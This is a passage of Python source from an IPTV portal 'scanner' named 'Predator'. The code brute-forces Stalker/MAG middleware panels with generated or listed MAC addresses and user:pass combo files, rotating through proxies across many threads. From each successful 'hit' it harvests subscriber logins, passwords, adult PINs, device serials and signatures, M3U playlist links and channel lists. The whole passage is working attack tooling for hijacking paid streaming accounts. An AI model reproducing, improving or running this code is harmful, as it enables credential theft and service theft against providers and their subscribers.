├● Pass ➤"""+str(spass)[:10]+"""...
├● Name ➤ """+str(sfname)+"""
├● Adult pass ➤ """+str(sparent)+""" 
├● ID ➤"""+str(stariff)+"""
├● Plan ➤"""+str(stariffplan)+"""
├● Max Online ➤ """+str(smaxonline)+"""
├● """+data_server(str(scountry))+""" Country ➤ """+str(scountry)+"""
├● Setting Pass ➤ """+str(ssettings)+"""
╰─────────────────⧳
"""+m3u_check+""""""
        		  	#print(stalker)
        		except:pass
        			
        		return stalker
        	   			     		
    def hit(proxysprint,options,mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi,panel,SNENC,SNCUT,DEVENC,DEVENC1,SINGENC,kanalsayisi,filmsayisi,dizisayisi,isstalker,veri_stalkerp,veri_stalker,adult):
    	global hitr, m3uonline, m3uoffline
    	global hityaz
    	try:
    		stalkerdata=''
    		if options == "S":
    		    stalkerdata=stalker(veri_stalkerp,veri_stalker, panel)                 
    		else:
    		    stalkerdata=str(playerapi)
    		
    		
    		if options == "S":
    		    m3u_url=" "
    		else:
    		    try:
        		  	 req=str(option.get(m3ulink, timeout=(2,5), allow_redirects=False,stream=True).status_code)       
        		  	 if req == "200" or (req == "302"):
        		  	    link_status="✅ ONLINE"
        		  	 else:
        		  	    link_status="🛑 OFFLINE"   
    		    except:
        		  	 link_status="🛑 OFFLINE"          		  	         		
    		    try:
        		  	 req=option.get(m3ulink, timeout=(2,5), allow_redirects=False,stream=True)
        		  	 m3u_text=(req.text)
        		  	 m3u_split=m3u_text.split("http://")[1]
        		  	 m3u_split=m3u_split.split("#EXTINF:")[0]
        		  	 m3u_checkurl="http://"+m3u_split
        		  	 req=str(option.get(m3u_checkurl, timeout=(2,5), allow_redirects=False,stream=True).status_code)
        		  	 if req == "200" or (req == "302"):
        		  	    m3uonline+=1
        		  	    m3u_url="""
        		  	    
╭──➤ 🔲 🅼3🆄 🄲🄷🄴🄲🄺
├● STATUS LINK ⧪
├● """+link_status+"""
├● STATUS CHANNEL ⧪
├● ✅ ONLINE
╰● M3U ➤ """+m3ulink+"""
    """
        		  	   
        		  	 else:
        		  	    m3uoffline+=1
        		  	    m3u_url="""
        		  	    
╭──➤ 🔲 🅼3🆄 🄲🄷🄴🄲🄺
├● STATUS LINK ⧪
├● """+link_status+"""
├● STATUS CHANNEL ⧪
├● 🛑 OFFLINE
╰● M3U ➤ """+m3ulink+"""
     """
        		  	   
    		    except:
        		  	 m3uoffline+=1
        		  	 m3u_url="""
╭──➤ 🔲 🅼3🆄 🄲🄷🄴🄲🄺
├● STATUS LINK ⧪
├● """+link_status+"""
├● STATUS CHANNEL ⧪
├● 🛑 OFFLINE
╰● M3U ➤ """+m3ulink+"""
    """
    
    		if serieslist == "":
    		    serie_url=" "
    		else:    		
    		    serie_url="""
    
 ⧪ 🆂🅴🆁🅸🅴🆂Ⓛⓘⓢⓣ ⧪
 """+serieslist
    
    		if livelist == "":
    		    live_url=" "
    		else:    		
    		    live_url="""
    
⧪ 🅻🅸🆅🅴Ⓛⓘⓢⓣ ⧪
 """+livelist
    
    		if vodlist == "":
    		    vod_url=" "
    		else:    		
    		    vod_url="""
    
⧪ 🆅🅾🅳Ⓛⓘⓢⓣ ⧪
 """+vodlist
    
    		if durum == "error":
    		    durum_info="""
    		    		    
╭──➤ 📡 🅾🅽🅻🅸🅽🅴 🅃🄴🅂🅃
├● IMAGE ➤ Not Checked
├● VPN ➤ """+str(vpn)+"""
╰────────────────⧳
"""
    		else:    		
    		    durum_info="""
    		    
╭──➤ 📡 🅾🅽🅻🅸🅽🅴 🅃🄴🅂🅃
├● IMAGE ➤ """+str(durum)+"""
├● VPN   ➤ """+str(vpn)+"""
╰────────────────⧳
"""		    		    
    				  		
    		if statusproxym==1:
    			modeprint="""
╭➤ [ 🔓 𝓟𝓡𝓞𝓧𝓨 𝓜𝓞𝓓𝓔 ]
╰➤ Proxy ➤ """+proxysprint  			
    		else:
    			modeprint=""    

    		    
    		imza="""
╭──➤ ☢️ 🅿🆁🅴🅳🅰🆃🅾🆁 ☢️
╰────[Mod 𝓑𝔂  Papy Gogo ]
"""+modeprint+"""
╭──➤ ❪❪ 🌐 🅂🄴🅁🅅🄴🅁 🌐 ❫❫    		
├● 🌍 REAL ⧪
├● """+str(real)+""""""+str(uzmanm2)+""""""+str(buri)+"""
├● PANEL ⧪
╰● http://"""+str(panel)+""""""+str(urib)+""""""+str(uzmanm2)+""""""+str(buri)+"""
    	
╭──➤ ❪❪ 🔌 🄲🄾🄽🄽🄴🄲🅃 🔌 ❫❫
├● Mac ➤"""+str(mac)+"""
├● """+str(trh)+  """
├● Scan Type ➤ """+uzmanm+"""
├● Scan Date ➤ """+str(time.strftime("%Y:%m:%d"))+"""
├● Adult pass ➤ """+str(adult)+"""
╰────────────────⧳

 """+str(stalkerdata)+""""""+durum_info+""""""+m3u_url+"""
      ❪❪ 🔓 🄴🄽🄲🅁🅈🄿🅃 🔓 ❫❫    
╭─➤ SN: """+SNENC+"""
├● SNCUT: """+SNCUT+"""
├● Device ID1: """+DEVENC+"""
├● Device ID2: """+SINGENC+"""
╰● Signature: """+SINGENC+"""    
    """
    		if len(kanalsayisi) > 1:
    			imza=imza+"""
╭─➤ Channels ➤"""+str(kanalsayisi)+"""    
├● Vod ➤"""+str(filmsayisi)+"""
╰─➤ Series ➤"""+str(dizisayisi)+"""    """

    		if  kanalkata=="1":
    			imza=imza+live_url			
    		elif kanalkata=="2":
    			imza=imza+live_url+vod_url
    		elif kanalkata=="3":
    			imza=imza+live_url+vod_url+serie_url
    
    		yax(imza)
    		
    		hityaz=hityaz+1
    		#print(imza)
    		if hityaz >= hitc:
    			hitr=""
    		
    	except:pass
    
    hitr=""
    
    def data_server(scountry):
    
        bandera=''
        pais=''
        origen=''
        
        try:
            codpais=scountry
            bandera=flag.flag(codpais)
            origen=bandera
        except:pass
        return origen
    
    
    	
    def vpnip(ip):
    	
    	url9="https://freegeoip.app/json/"+ip
    	vpnip=""
    	veri=""
    	try:
    		res = option.get(url9,  timeout=7, verify=False)
    		veri=str(res.text)
    		if not '404 page' in veri:
    			vpnips=veri.split('"country_name":"')[1]
    			vpn=vpnips.split('"')[0]
    		else:
    			vpn="🕶️ Anonymous"
    	except:
    		vpn="🕶️ Anonymous"
    	return vpn
    
    def goruntu(link,panel):
    	try:
    		res = option.get(link,  headers=hea3(panel), timeout=(2,5), allow_redirects=False,stream=True)
    		code=res.status_code
    		duru="🔒 🅻🅾🅲🅺🅴🅳       "
    		if res.status_code==302 or res.status_code==206:
    			 duru="✅ 🅾🅽🅻🅸🅽🅴        "
    	except:
    		duru="🔒 🅻🅾🅲🅺🅴🅳      "
    		
    
    	return duru
    
    tokenr="\33[1m"								
    def hitprint(mac,trh):
    	playsound('./Python_Portable/settings/sounds/ching.mp3')
    	file = pathlib.Path()
    	try:
    		if file.exists():
    		    ad.mediaPlay()
    		    
    	except:pass
    
    def list(listlink,macs,token,livel,panel):
    	kategori=""
    	veri=""
    	bag=0
    	while True:
    		try:
    			res = option.get(listlink,  headers=hea2(macs,token,panel), timeout=15, verify=False)
    			veri=str(res.text)
    			break
    		except:
    			bag=bag+1
    			time.sleep(1)
    			if bag==12:
    				break
    			
    	if veri.count('title":"')>1:
    			for i in veri.split('title":"'):
    				try:
    					kanal=""
    					kanal= str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace('\/','/')
    				except:pass
    				kategori=kategori+kanal+livel
    	kategori=kategori.replace("{","")
    	list=kategori
    	return list

    	
    def m3uapi(playerlink,macs,token,panel):
    	mt=""
    	bag=0
    	
    	while True:
    			try:
    				res = option.get(playerlink, headers=hea2(macs,token,panel), timeout=7, verify=False)
    				veri=""
    				veri=str(res.text)    				
    				break
    			except:    			
    				time.sleep(1)
    				bag=bag+1
    				if bag==6:
    					break
    	try:
    			acon=""
    			if 'active_cons' in veri:
    				acon=veri.split('active_cons":')[1]
    				acon=acon.split(',')[0]
    				acon=acon.replace('"',"")
    				mcon=veri.split('max_connections":')[1]
    				mcon=mcon.split(',')[0]
    				mcon=mcon.replace('"',"")
    				status=veri.split('status":')[1]
    				status=status.split(',')[0]
    				status=status.replace('"',"")
    				timezone=veri.split('timezone":"')[1]
    				timezone=timezone.split('",')[0]
    				timezone=timezone.replace("\/","/")
    				realm=veri.split('url":')[1]
    				realm=realm.split(',')[0]
    				realm=realm.replace('"',"")
    				port=veri.split('port":')[1]
    				port=port.split(',')[0]
    				port=port.replace('"',"")
    				userm=veri.split('username":')[1]
    				userm=userm.split(',')[0]
    				userm=userm.replace('"',"")
    				pasm=veri.split('password":')[1]
    				pasm=pasm.split(',')[0]
    				pasm=pasm.replace('"',"")
    				bitism=""
    				bitism=veri.split('exp_date":')[1]
    				bitism=bitism.split(',')[0]
    				bitism=bitism.replace('"',"")

    				message=veri.split('message":"')[1].split(',')[0].replace('"','')
    				message=str(message.encode('utf-8').decode("unicode-escape")).replace('\/','/')
    				if status=="Active":
    					statusp="\n├● ✅ Status ➤ "+status	
    				else:
    					status="\n├● 🛑 Status ➤ "+status	
    				
    				if message=="":
    					message_info=""
    				else:
    					message_info="\n├● ✉️ Message ➤ "+str(message)
    				
    				
    	
    				if bitism=="null":
    					bitism="Unlimited"
    				else:
    					bitism=(datetime.datetime.fromtimestamp(int(bitism)).strftime('%d-%m-%Y %H:%M:%S'))    					    					
    				mt=("""
╭➤ ❪❪ 💎 🅿🅾🆁🆃🅰🅻ⓅⒽⓅ 💎 ❫❫"""+statusp+"""
├● Login ➤ """+userm+"""
├● Pass ➤ """+pasm+"""
├● Act. Connx ➤ """+acon+"""
├● Max Online ➤ """+mcon+""""""+message_info+""" 
├● TimeZone ➤ """+timezone+"""    
╰────────────────⧳  """)
    	except:pass
    	return mt
    scanend=0
    pattern= "(\w{2}:\w{2}:\w{2}:\w{2}:\w{2}:\w{2})"		
    panelsay=0	
    bots =0
    botsay=0
    end=""
    def echok(mac,bot,total,totalc,hitc,oran,oranc,tokenr,panel):
    	global panelc, scanend, proxyslen
    	global hitr, echo, m3uonline, m3uoffline
    	global proxysok, proxysoklen,proxysbad, proxysbadlen
    	response=""
    	num_serv=0
    	
    	if statusproxym==1:    		
    		proxi="""
        
╭●\33[1;107;44m PROXY INFO \33[0m
├●\33[1;33m TOTAL =  """+str(proxyslen)+""" \33[0m
├●\33[1;33m BAD  =  """+str(proxysbadlen)+""" \33[0m 
╰●\33[1;33m GOOD =  """+str(proxysoklen)+""" \33[0m        
        
    		"""
    	else:
    		proxi=""   	
    	if multipanel == "1":    	
    		for l in panelc:
    			num_serv=len(l)
    	if num_serv==0:
    		num_serv=1
    	if options=="S":
    		scan="ѕтαℓкєя ρσятαℓ"
    	else:    	
    			scan="ρσятαℓ.ρнρ"	     
    	if scanend==1:
    			scanend=2
    			end="""
    			
    			   			
╭──────● ☢️ SCAN END ☢️
╰● THANKS FOR USING MY SCAN   """
    	else:
    			end=""

    	urlip = 'http://httpbin.org/ip'
    	try:        
    			response = option.get(urlip, headers=headers, timeout=5).text   			
    	except:pass

   
        			
    	echo=("""
 \33[1m    PREDATOR BY PROARTIX
╭─● \33[0m\33[1;107;44m maclink  \33[1;7m """+str(panel.replace('/stalker_portal','').replace('/c',''))+  """ \33[0m
├─● """+tokenr+str(mac)+"""  \33[0m
├──●  \33[1;33m"""+str(hitr)+"""Hit="""+str(hitc)+"""\33[0m  \33[1;33m%"""+str(oran)+"""  \33[0m
├───●  \33[1mBots= """+str(opcionbots)+"""  \33[1m Total="""+str(totalc)+"""/"""+str(macuz)+"""   \33[0m
├────●  \33[1;33m"""+str(uzmanm)+"""  \33[0m 
╰─────●  \33[1;1mM3U INFO = \33[1;1mONLINE*"""+str(m3uonline)+""" \33[0m\33[1;1mOFFLINE*"""+str(m3uoffline)+""" \33[0m
"""+proxi+"""
"""+end+"""          """)
    		
    oranc=0
    totalc=0	
    def gui():                   
        while True:              
            global scanend, m3uonline,panelc,echo, mac,bot,total,totalc,hitc,oran,oranc,tokenr,panel            
            try:
                if totalc <= total:                
                    totalc=total
                if oranc <= oran:
                    oranc=oran                                  
            except:pass
            time.sleep(0.5)           
            echok(mac,bot,total,totalc,hitc,oran,oranc,tokenr,panel)          
            print("\033[H\033[J", end="")
            statusproxy()
            print(feyzo)  
            print(echo)
            time.sleep(0.5)
            if scanend==2:
                quit()      
            

    def run(opcionbots):
        runbots=0
        global panelsay,botsay
        while runbots <= opcionbots:
            if opcionbots==1: 
                time.sleep(1)          
            t1 = threading.Thread(target=d1)
            t1.start()            
            panelsay=0
            runbots+=1
            botsay=botsay+1                        
        startgui = threading.Thread(target=gui)
        startgui.start()
        
    total=0    
    proxyr=0
    selectprox=0
    def randomproxy():    
        global selectprox, proxysok, proxyslen, checkproxyend
        dirp='./proxies/'
        say=0    
        for files in os.listdir (dirp):
            say+=1
            if str(proxyfile)==str(say):
                pdosya=(dirp+files)            
                #break            
        proxyf=open(pdosya).readlines()
    
        proxyslen=len(proxyf)
        if selectprox==proxyslen:
            proxys=random.choice(proxysok)
            checkproxyend=1      
        else:
            selectprox+=1
            proxys=(proxyf[selectprox])    
        return proxys

    def myip():        
        url = 'http://httpbin.org/ip'
        try:
            ip = option.get(url, headers=headers, timeout=5).text        
        except:pass

        
    proxysok=[]
    proxysoklen=0
    proxysbad=[]
    proxysbadlen=0
    checkproxyend=0
    def d1():
    	global proxysok, proxysoklen,proxysbad, proxysbadlen, checkproxyend
    	global hitc
    	global hitr, scanend
    	global tokenr,bots,panelsay,botsay,bot
    	global panelc, totalc, m3uonline
    	global mac,bot,total,hitc,oran,tokenr,panel
    	say=0
    	    	
    	dir='./combo/'   
    	if multipanel=="1":
    		for files in os.listdir (dir):
    			say+=1    
    			if paneles==str(say):
    				pdosya=(dir+files)            
    				break    
    		panelc=open(pdosya).read().splitlines()
    		panel=random.choice(panelc)
    	else:
    		panel=opcionuni

    	panel=panel.replace("http://","")
    	panel=panel.replace("/c","")
    	panel=panel.replace("/","")
    	panel=panel.replace('stalker_portal','/stalker_portal')
    	
    
    	bots=bots+1
    	botc=bots
    	
    	for mc in range(botsay,macuz,1):	 
    		if total==macuz:
    		    scanend=1
    		    break
    		    quit()    		    
    		
    		if statusproxym==0:    
    		    total=total+1
    		else:
        		time.sleep(0.1)   		    		
        
    		if dsyno=="0":
    		    mac=randommac()
    		else:
    		    mac=mactotLen[mc].replace('\n','')
    		    macv=re.search(pattern,mactotLen[mc],re.IGNORECASE)
    		    if macv:
    		        mac=macv.group()
    		    else:
    		         continue
    		macs=mac.upper().replace(':','%3A')
    		#mac="00:1A:79:00:3B:9D"		
    		#macs="00:1A:79:00:3B:9D"
    		bot="Bot_"+str(botc)
    		oran=""
    		oran=round(((total)/(macuz)*100),2)    		    		    		  		
    		bag=0
    		veri=""
    		proxysprint="" 
    		while True:
    			proxyr=0    									    	    			
    			if protocol==1:
        			proxys=randomproxy()
        			proxysprint=proxys        			          
        			proxy.proxies = {
        			'https': proxys ,
        			'http': proxys
        			}
    			if protocol==2:
        			proxys=randomproxy()
        			proxysprint=proxys        			          
        			proxy.proxies = {
        			'https': 'socks4://'+proxys ,
        			'http': 'socks4://'+proxys
        			}  
    			if protocol==3:
        			proxys=randomproxy()
        			proxysprint=proxys        			          
        			proxy.proxies = {
        			'https': 'socks5://'+proxys ,
        			'http': 'socks5://'+proxys
        			}        			      		
    			if multipanel=="1":
 										       			
    				#tokenr="🔘"
    				panel=random.choice(panelc)
    				panel=panel.replace("http://","")
    				panel=panel.replace("/c","")
    				panel=panel.replace("/","")
    				panel=panel.replace('stalker_portal','/stalker_portal')			
    			try:
    				#myip()   									         			
    				res = option.get(url1(panel), headers=hea1(panel,macs), timeout=15, verify=False)
    				veri=str(res.text)
    				break
    			except:
    				if statusproxym==1:         		        		
    				 if proxys in proxysbad:
    				  time.sleep(0.1)
    				  proxyr=1
    				 else:
    				  if checkproxyend==0:
    				   proxysbad+=[proxys]
    				  proxysbadlen=len(proxysbad)
    				  proxyr=1
    				bag=bag+1
    				time.sleep(0.5)
    				if bag==5:
    					break
    		tokenr="\33[35m"
    		if proxyr==0:
        		if statusproxym==1:    
        			total=total+1        		        		
        			if proxys in proxysok:
        				time.sleep(0.1)
        			else:
        				if checkproxyend==0:           
        				 proxysok+=[proxys]
        				proxysoklen=len(proxysok)        
        		if 'token' in veri:
        			tokenr="\33[1m"
        			token=veri.replace('{"js":{"token":"',"")
        			token=token.split('"')[0]
        			bag=0
        			
        			while True:
        			   try:
        			     res = option.get(url22(panel,macs), headers=hea2(macs,token,panel), timeout=15, verify=False)
        			     veri=""
        			     veri=str(res.text)
        			     veri_stalkerp=""
        			    
        			     veri_stalkerp=veri
        			     isstalker=''
        			     if 'stalker_portal' in veri_stalkerp:
        			         isstalker='S'
        			     else:
        			         isstalker='N'
        			         
        			     break
        			   except: 				     	
        			     bag=bag+1
        			     time.sleep(1)
        			   if bag==5:
        			     break
        			id="null"
        			adult=""
        			ip=""
        			try:
        			     id=veri.split('{"js":{"id":')[1]
        			     id=id.split(',"name')[0]
        			     adult=veri.split('parent_password":"')[-1]
        			     adult=adult.split('"')[0]
        			     ip=veri.split('ip":"')[1]
        			     ip=ip.split('"')[0]
        			   
        			except:pass
        			if not id=="null":
        			    bag=0
        			    while True:
        			     	try:
        				     	res = option.get(url3(panel), headers=hea2(macs,token,panel), timeout=15, verify=False)
        				     	veri=""
        				     	veri=str(res.text)
        				     	veri_stalker=""
        				     	veri_stalker=veri
        				     	break
        			     	except:
        				     	#print("test 2")
        				     	bag=bag+1
        				     	time.sleep(1)
        				     	if bag==5:
        				     		break
        			    if not veri.count('phone')==0:
        			     	hitr="\33[1;36m"
        			     	hitc=hitc+1
        			     	trh=""
        			     	if 'end_date' in veri:	
        			     		trh=veri.split('end_date":"')[1]
        			     		trh=trh.split('"')[0]
        			     		
        			     	else:
        			     		  try:
        			     		      trh=veri.split('phone":"')[1]
        			     		      trh=trh.split('"')[0]
        			     		      if trh.lower()[:2] =='un':
        			     		      	KalanGun=(" Days")
        			     		      else:
        			     		      	KalanGun=(str(tarih_clear(trh))+" Days")
        			     		      trh='Exp. in '+KalanGun
        			     		  except:pass
        			     	
        			   
        			     	hitprint(mac,trh)
        			     	bag=0
        			     	while True:
        			     		try:
        			     			#print(str(url6(panel)+"6"))
        				     		res = option.get(url6(panel), headers=hea2(macs,token,panel), timeout=10, verify=False)
        				     		veri=""
        				     		veri=str(res.text)
        				     		cid=""
        				     		cid=(str(res.text).split('ch_id":"')[100].split('"')[0])
        				     		#print(veri)	     		
        				     		break
        				     	except:    				     		
        				     		bag=bag+1
        				     		time.sleep(0.5)
        				     		if bag==5:
        				     			#quit()
        				     			cid="94067"
        				     			break
        			     	real=panel
        			     	m3ulink=""
        			     	user=""
        			     	pas=""
        			     	durum="error"
        			     	bag=0
        			     	if options=="S":
        			     		try: 
        			     			url="http://"+panel+"/"+uzmanm+"?type=itv&action=create_link&cmd=ffrt%20http://localhost/ch/"+str(cid)
        			     			res = option.get(url, headers=hea2(macs,token,panel), timeout=15, verify=False)
        			     			veris=""
        			     			veris=str(res.text)			     	
        			     			link=veris.split('cmd":"')[1].split('"')[0].replace('\/','/')
        			     			durum=goruntu(link,panel)
        			     		except:pass	    			
        			     	while True:
        			     		try:
        				     		url="http://"+panel+"/"+uzmanm+"?type=itv&action=create_link&cmd=ffmpeg%20http://localhost/ch/"+str(cid)+"_&series=&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml"
        				     		res = option.get(url, headers=hea2(macs,token,panel), timeout=15, verify=False)
        				     		veri=""
        				     		veri=str(res.text)
        				     		    				     		
        				     		link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
        				     		real='http://'+link.split('://')[1].split('/')[0]
        				     		user=str(link.replace('live/','').split('/')[3])
        				     		pas=str(link.replace('live/','').split('/')[4])
        				     		m3ulink="http://"+real.replace('http://','').replace('/c/', '')+"/get.php?username="+str(user)+"&password="+str(pas)+"&type=m3u_plus&output=m3u8" 
        				     		durum=goruntu(link,panel)
        				     		break
        				     		#print(veri)				     		
        				     	except:    				     		 
        				     		bag=bag+1
        				     		time.sleep(0.1)
        				     		if bag==5:
        				     			break
        			     	playerapi=""
        			     	if not m3ulink=="":
        			     		playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
        			     		
        			     		playerapi=m3uapi(playerlink,macs,token,panel)
        			     		if playerapi=="":
        			     			playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
        			     			playerapi=m3uapi(playerlink,macs,token,panel)
        			     			
    
        			     	dstalker=""
        			     	if not m3ulink=="":
        			     		    playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
        			     		    playerapi=m3uapi(playerlink,macs,token,panel)
        			     		    if playerapi=="":
        			     		        playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
        			     		        playerapi=m3uapi(playerlink,macs,token,panel)			     						     			
        			     			
        			     	SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
        			     	SNENC=SN.upper()
        			     	SNCUT=SNENC[:13]
        			     	DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
        			     	DEVENC=DEV.upper()
        			     	DEV1=hashlib.sha256(SNCUT.encode('utf-8')).hexdigest()
        			     	DEVENC1=DEV1.upper()
        			     	SG=SNCUT+'+'+(mac)
        			     	SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
        			     	SINGENC=SING.upper()
        				     	
        			     	url10="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_live_streams"
        			     	while True:
			     	            		try:
			     	            			res = option.get(url10,  headers=hea2(macs,token,panel), timeout=15, verify=False)
			     	            			break
 			     	           		except:
 			     	           			bag1=bag1+1
 			     	           			time.sleep(2)
 			     	           			if bag1==4:
			     	            			 	break

        			     	bag1=0
        			     	veri=str(res.text)
        			     	kanalsayisi=str(veri.count("stream_id"))
        			     	#print(kanalsayisi)
        			     	url10="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_vod_streams"
        			     	while True:
			     	            		try:
			     	            			res = option.get(url10, headers=hea2(macs,token,panel), timeout=15, verify=False)
			     	            			break
 			     	           		except:
 			     	           			bag1=bag1+1
 			     	           			time.sleep(2)
			     	            			if bag1==4:
			     	            			 	break
        			     	bag1=0
        			     	veri=str(res.text)
        			     	filmsayisi=str(veri.count("stream_id"))
            	
        			     	url10="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_series"
        			     	while True:
			     	            		try:
			     	            			res = option.get(url10, headers=hea2(macs,token,panel), timeout=15, verify=False)
			     	            			break
			     	            		except:
			     	            			bag1=bag1+1
 			     	           			time.sleep(2)
			     	            			if bag1==4:
 			     	           			 	break
        			     	bag1=0
        			     	veri=str(res.text)
        			     	dizisayisi=str(veri.count("series_id"))        			     	
        			    
        			     	vpn=""
        			     	if not ip =="":
        			     		vpn=vpnip(ip)
        			     	else:
        			     	 	vpn="🕶️ Anonymous"
        			     	livelist=""
        			     	vodlist=""
        			     	serieslist=""
        			     	if kanalkata=="1" or kanalkata=="2" or kanalkata=="3":  	   
        			     		listlink=liveurl(panel) 
        			     		livel=' «⭐️» '
        			     		livelist=list(listlink,macs,token,livel,panel)
        			     		listlink=vodurl(panel) 			     		
        			     		livel=' «💥️» '
        			     		vodlist=list(listlink,macs,token,livel,panel)
        			     		listlink=seriesurl(panel) 
        			     		livel=' «⚡️️» '
        			     		serieslist=list(listlink,macs,token,livel,panel)
        			     	hit(proxysprint,options,mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi,panel,SNENC,SNCUT,DEVENC,DEVENC1,SINGENC,kanalsayisi,filmsayisi,dizisayisi,isstalker,veri_stalkerp,veri_stalker,adult)
        
        
    run(opcionbots)




if selectop=="2": #m3option
    
    pattern= "(^\S{2,}:\S{2,}$)|(^.*?(\n|$))"
    print("\033[H\033[J", end="")
    say=0
    hit=0
    bul=0
    cpm=1
    
    	
    
    	
    say=0
    dsy=""
    dir='./combo/'
    statusproxy()
    print(feyzo)
    print("""  
    \33[1;31m \33[0m\33[1;32mSELECT USER:PASS COMBO  \33[36m    
    """)    
    for files in os.listdir (dir):
    	say=say+1
    	dsy=dsy+"	\33[1;31m"+str(say)+"\33[0m\33[1;32m = \33[0m \33[36m"+files+'\33[36m\n'
    print ("""   	
    """+dsy+"""    """)
    
    dsyno=str(input("""
\33[36m
FILE = \33[36m\33[36m\33[36m"""))
    say=0
    for files in os.listdir (dir):
    	say=say+1
    	if dsyno==str(say):
    		dosyaa=(dir+files)
    		break
    say=0
    
    
    
    
    		
    print("\033[H\033[J", end="")
    statusproxy()
    print(feyzo) 
    print("""
    \33[1;31m \33[0m\33[1;32mSELECT NUMBER OF BOTS\33[36m
    	
    \33[1;31m*\33[0m \33[36m1 - 100 RECOMMENDED \33[36m
    """)
    opcionbots=input("""\33[36m
BOTS = \33[36m\33[36m\33[36m""")
    opcionbots=int(opcionbots)
     		
    
    HEADERd={
    "Cookie": "stb_lang=en; timezone=Europe%2FIstanbul;",
    "X-User-Agent":"Model: MAG254; Link: Ethernet",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip, deflate",
    "Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
    "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3",
                }		
         							
    dsy=dosyaa
    combo=dsy
    dosya=""
    
       
    	                        
    print("\033[H\033[J", end="")
    statusproxy()
    print(feyzo)     
    print("""
    \33[1;31m \33[0m\33[1;32mFILE SELECTED:: """+dsy+"""\33[36m
    	
    \33[1;31m*\33[0m \33[36mTYPE PORTAL TO SCAN \33[36m
    """) 

    panel = input("""\33[36m
PORTAL = \33[36m\33[36m\33[36m""")
    if panel=="":
        panel="http://flextv.io"
    #=======+++=++++++====++=======
    panel=panel.replace("http://","")
    panel=panel.replace("/c","")
    panel=panel.replace("/","")
    portal=panel    
    kanall=""
    print("\033[H\033[J", end="")
    statusproxy()
    print(feyzo) 
    kanall=input("""  
    \33[1;31m \33[0m\33[1;32mSHOW CATEGORY CONTENT ? \33[36m    
    	
    \33[1;31m1 \33[0m\33[1;32m= \33[0m \33[36mYes \33[36m    
    \33[1;31m2 \33[0m\33[1;32m= \33[0m \33[36mNo \33[36m    
        
\33[36m
OPTION = \33[36m\33[36m\33[36m""")
    if not kanall=="1":
    	kanall=2
    print("\033[H\033[J", end="")
    statusproxy()
    print(feyzo) 
    hitn=str(input("""
    \33[1;31m \33[0m\33[1;32mFILE NAME TO SAVE  \33[36m    
    
\33[36m
ɴᴀᴍᴇ ꜰɪʟᴇ = \33[36m\33[36m\33[36m"""))
    if hitn=="":
    	hitn="PredatorM3U"	

    c=open(dsy, 'r')
    totLen=c.readlines()
    uz=(len(totLen))
    	                                         
    
    def kategori(katelink):    		
    	#try:
    		res = option.get(katelink,headers=HEADERd, timeout=15, verify=False)
    		veri=""
    		kate=""
    		veri=str(res.text)
    		#print(veri)
    		for i in veri.split('category_name":"'):
    			kate=kate+"""
 ❪🟢❫➤ """+str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace('\/','/')
    		kate=kate.replace("\n ❪🟢❫➤ [{ ","")
    	#except:pass
    	#print(kate)
    		return kate
    
    def m3u_check(m3u_link):
        links=[]
        global hitr
        try:
            req=str(option.get(m3u_link, timeout=(60), allow_redirects=False,stream=True).status_code)            
            if req == "200" or (req == "302"):
                link_status="✅ ONLINE"
            else:
                link_status="🛑 OFFLINE"        		
        except:
            link_status="🛑 OFFLINE"
        try:
        
            req=option.get(m3u_link,headers=HEADERd,timeout=(60), allow_redirects=False, stream=True)
            m3u_text=(req.text)  
            #print(m3u_text)
            for lines in req.iter_lines():
                #print(lines)
                if "mkv" in str(lines):
                    m3u_check=str(lines).replace("b'"," ").replace("'"," ")
                    #print("mkv")
                    break 
                if "mp4" in str(lines):
                    m3u_check=str(lines).replace("b'"," ").replace("'"," ")
                    #print("mp4")
                    break                   

            if statusproxym==1:
                invpn="(IN PROXY)"
            else:
                invpn=""
            req=str(option.get(m3u_check,headers=HEADERd, timeout=(180), allow_redirects=False, stream=True).status_code)
            if req == "200" or (req == "302"):
                m3u_result="""
        		  	   
╭──➤ 🔲 🅼3🆄 🄲🄷🄴🄲🄺
├❪🔘❫ 𝙎𝙏𝘼𝙏𝙐𝙎 𝙇𝙄𝙉𝙆 ⧪
├● """+link_status+""" """+invpn+"""
╰● 📺 𝙈3𝙐 ➤ """+m3u_link+"""

╭❪🔘❫ 𝙎𝙏𝘼𝙏𝙐𝙎 𝘾𝙃𝘼𝙉𝙉𝙀𝙇 ⧪
├● ✅ ONLINE """+invpn+"""
╰❪🔘❫ 🎲 𝙋𝙇𝘼𝙔 ➤ """+m3u_check+"""
     """
                print(m3u_result)
            else:
                m3u_result="""
        		  	   
╭──➤ 🔲 🅼3🆄 🄲🄷🄴🄲🄺
├❪🔘❫ 𝙎𝙏𝘼𝙏𝙐𝙎 𝙇𝙄𝙉𝙆 ⧪
├● """+link_status+""" """+invpn+"""
╰● 📺 𝙈3𝙐 ➤ """+m3u_link+"""

╭❪🔘❫ 𝙎𝙏𝘼𝙏𝙐𝙎 𝘾𝙃𝘼𝙉𝙉𝙀𝙇 ⧪
├● 🛑 OFFLINE """+invpn+"""
╰❪🔘❫ 🎲 𝙋𝙇𝘼𝙔 ➤ """+m3u_check+"""
     """
                print(m3u_result)
        except:
